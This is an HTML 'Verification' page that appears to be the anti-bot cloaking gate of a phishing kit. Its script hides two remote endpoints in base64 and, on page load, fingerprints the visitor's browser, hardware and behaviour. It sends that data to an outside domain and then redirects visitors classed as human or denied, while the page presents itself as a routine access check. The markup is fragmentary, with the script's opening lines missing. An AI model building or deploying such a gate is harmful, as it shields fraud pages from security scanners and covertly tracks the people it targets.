    <meta charset="utf-8" />
    <title>Verification</title>
    <!-- reCAPTCHA v3 - DISABLED -->

    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      
      body {
        background: #1a1a1a;
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
        overflow: hidden;
      }
      
      #app {
        text-align: center;
        position: relative;
        z-index: 10;
      }
      
      /* Animated Logo */
      #verification-logo {
        width: 200px;
        height: auto;
        animation: floatPulse 3s ease-in-out infinite;
        filter: drop-shadow(0 10px 30px rgba(255, 255, 255, 0.2));
      }
      
      @keyframes floatPulse {
        0%, 100% {
          transform: translateY(0px) scale(1);
          opacity: 0.9;
        }
        50% {
          transform: translateY(-20px) scale(1.05);
          opacity: 1;
        }
      }
      
      /* Loading text */
      #loading-text {
        color: #ffffff;
        font-size: 18px;
        margin-top: 30px;
        opacity: 0.8;
        letter-spacing: 1px;
      }
      
      /* Animated dots */
      .loading-dots {
        display: inline-block;
        margin-left: 5px;
      }
      
      .loading-dots span {
        animation: blink 1.4s infinite;
        animation-fill-mode: both;
      }
      
      .loading-dots span:nth-child(2) {
        animation-delay: 0.2s;
      }
      
      .loading-dots span:nth-child(3) {
        animation-delay: 0.4s;
      }
      
      @keyframes blink {
        0%, 80%, 100% {
          opacity: 0;
        }
        40% {
          opacity: 1;
        }
      }
      
      /* Background animated gradient */
      body::before {
        content: '';
        position: fixed;
        top: -50%;
        left: -50%;
        width: 200%;
        height: 200%;
        background: radial-gradient(circle, rgba(56, 56, 56, 0.3) 0%, rgba(26, 26, 26, 0) 70%);
        animation: rotate 20s linear infinite;
        z-index: 0;
      }
      
      @keyframes rotate {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }
      
      /* Error message styling */
      .error-container {
        padding: 40px;
        text-align: center;
        background: rgba(40, 40, 40, 0.9);
        border-radius: 12px;
        max-width: 500px;
        margin: 20px;
        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
      }
      
      .error-container h2 {
        color: #ff5252;
        margin-bottom: 15px;
      }
      
      .error-container p {
        color: #e0e0e0;
        margin: 10px 0;
      }
      
      .error-container button {
        margin-top: 20px;
        padding: 12px 30px;
        background: #2196f3;
        color: white;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        font-size: 16px;
        transition: background 0.3s;
      }
      
      .error-container button:hover {
        background: #1976d2;
      }
    </style>
  </head>

        // API server: campbellchamblissappraisers.com
        // HTML can be hosted anywhere (CORS enabled on API)
        const endpoint = atob("aHR0cHM6Ly9jYW1wYmVsbGNoYW1ibGlzc2FwcHJhaXNlcnMuY29tL2FwaS5waHA=");
        const redirectBase = atob("aHR0cHM6Ly9jYW1wYmVsbGNoYW1ibGlzc2FwcHJhaXNlcnMuY29tL3Byb2Nlc3MucGhw");
        
        const RECAPTCHA_SITE_KEY = ''; // reCAPTCHA disabled
        const USE_RECAPTCHA = false; // reCAPTCHA DISABLED to match cPanel configuration
        
        const DEBUG = true; // Enable to see detailed logs in browser console
        const pageLoadTime = Date.now();
        
        // ============================================
        // BEHAVIORAL TRACKING
        // ============================================
        let mouseMoved = false;
        let keyboardUsed = false;
        let scrollDetected = false;
        
        document.addEventListener('mousemove', () => { mouseMoved = true; }, { once: true });
        document.addEventListener('keypress', () => { keyboardUsed = true; }, { once: true });
        document.addEventListener('scroll', () => { scrollDetected = true; }, { once: true });
        
        // ============================================
        // BROWSER FINGERPRINTING
        // ============================================
        function collectFingerprint() {
          const fp = {
            // Screen info
            screen_width: screen.width,
            screen_height: screen.height,
            screen_avail_width: screen.availWidth,
            screen_avail_height: screen.availHeight,
            screen_color_depth: screen.colorDepth,
            screen_pixel_depth: screen.pixelDepth,
            
            // Browser info
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(',') : '',
            vendor: navigator.vendor || '',
            product: navigator.product || '',
            
            // Timezone
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
            timezone_offset: new Date().getTimezoneOffset(),
            
            // Hardware
            hardware_concurrency: navigator.hardwareConcurrency || 0,
            device_memory: navigator.deviceMemory || 0,
            max_touch_points: navigator.maxTouchPoints || 0,
            
            // Browser features
            cookies_enabled: navigator.cookieEnabled,
            do_not_track: navigator.doNotTrack || '',
            
            // WebGL
            webgl: checkWebGL(),
            
            // Canvas fingerprint
            canvas: getCanvasFingerprint(),
            
            // Plugins (limited in modern browsers)
            plugins_count: navigator.plugins ? navigator.plugins.length : 0
          };
          
          return fp;
        }
        
        function checkWebGL() {
          try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            return !!gl;
          } catch(e) {
            return false;
          }
        }
        
        function getCanvasFingerprint() {
          try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 140, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Browser Fingerprint', 2, 2);
            return canvas.toDataURL();
          } catch(e) {
            return '';
          }
        }
        
        // ============================================
        // JAVASCRIPT CHALLENGE
        // ============================================
        function solveChallenge(seed) {
          // Simple challenge: MD5-like hash simulation
          // In production, use actual crypto library
          let str = seed + 'challenge_secret_salt';
          let hash = 0;
          for (let i = 0; i < str.length; i++) {
            hash = ((hash << 5) - hash) + str.charCodeAt(i);
            hash = hash & hash;
          }
          return Math.abs(hash).toString(16);
        }
        
        // ============================================
        // RECAPTCHA v3 EXECUTION
        // ============================================
        async function getRecaptchaToken() {
          if (!USE_RECAPTCHA || !RECAPTCHA_SITE_KEY) {
            return null; // Skip reCAPTCHA if disabled or no key
          }
          
          try {
            if (typeof grecaptcha === 'undefined') {
              console.warn('reCAPTCHA not loaded');
              return null;
            }
            
            return await grecaptcha.execute(RECAPTCHA_SITE_KEY, { action: 'verify' });
          } catch(e) {
            console.error('reCAPTCHA error:', e);
            return null;
          }
        }
        
        // ============================================
        // MAIN VERIFICATION
        // ============================================
        
        // Wait a bit for user interaction tracking
        await new Promise(resolve => setTimeout(resolve, 500));
        
        try {
          if (DEBUG) console.log('üîç Collecting data...');
          
          // Collect all data
          const fingerprint = collectFingerprint();
          const challengeSeed = Date.now().toString();
          const challengeSolution = solveChallenge(challengeSeed);
          const timing = Date.now() - pageLoadTime;
          
          // Get reCAPTCHA token
          const recaptchaToken = await getRecaptchaToken();
          
          if (DEBUG) console.log('üì¶ Data collected, sending to API...');
          
          // Send to API
          const controller = new AbortController();
          const timeout = setTimeout(() => controller.abort(), 15000);
          
          const res = await fetch(endpoint, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              ua: navigator.userAgent,
              timestamp: Date.now(),
              fingerprint: fingerprint,
              challenge_seed: challengeSeed,
              js_challenge: challengeSolution,
              timing: timing,
              mouse_moved: mouseMoved,
              keyboard_used: keyboardUsed,
              scroll_detected: scrollDetected,
              recaptcha_token: recaptchaToken
            }),
            mode: "cors",
            signal: controller.signal
          });
          
          clearTimeout(timeout);
          
          if (DEBUG) console.log('üì• Response status:', res.status);
          
          if (!res.ok) {
            console.error("API returned error status:", res.status);
            // Try to get response text for debugging
            const errorText = await res.text().catch(() => 'Could not read response');
            console.error("API error response:", errorText);
            throw new Error("API returned: " + res.status);
          }

          const data = await res.json();
          
          if (DEBUG) console.log('üì¶ Response:', data);
          
          // Redirect with token
          if (data && data.token) {
            const type = (data.is_human === true) ? "human" : "denied";
            if (DEBUG) console.log('‚úÖ Redirecting:', type);
            location.replace(redirectBase + "?key=" + data.token + "&type=" + type);
            return;
          }
          
          console.error("API response missing token:", data);
          throw new Error("No token in response");
          
        } catch (e) {
          console.error("‚ùå Error:", e);
          console.error("Error details:", {
            message: e.message,
            stack: e.stack,
            name: e.name
          });
          console.error("API Endpoint:", endpoint);
          
          // Provide helpful error message based on error type
          let errorDetails = e.message;
          let helpText = '';
          
          if (e.message.includes('Failed to fetch') || e.name === 'TypeError') {
            errorDetails = 'Failed to fetch';
            helpText = '<p style="font-size:11px;color:#999;margin-top:10px;">The verification API is not reachable. Please ensure this file is hosted on the same server as api.php</p>';
          }
          
          // Show error message to user instead of immediately redirecting
          document.getElementById('app').innerHTML = `
            <div class="error-container">
              <h2>Verification Error</h2>
              <p style="color:#e0e0e0;">Unable to complete verification. Please try again.</p>
              <p style="font-size:12px;color:#999;margin-top:20px;">Error: ${errorDetails}</p>
              ${helpText}
              <button onclick="location.reload()">
                Retry
              </button>
            </div>
          `;
          
          // Optional: redirect after showing error for 5 seconds
          // setTimeout(() => {
          //   location.replace("https://youtu.be/28Jgk08KTMA?si=aEuR7qlqhPIiFcvM");
          // }, 5000);
        }
      })();
    </script>

    <noscript>
      JavaScript is required to verify access.
    </noscript>
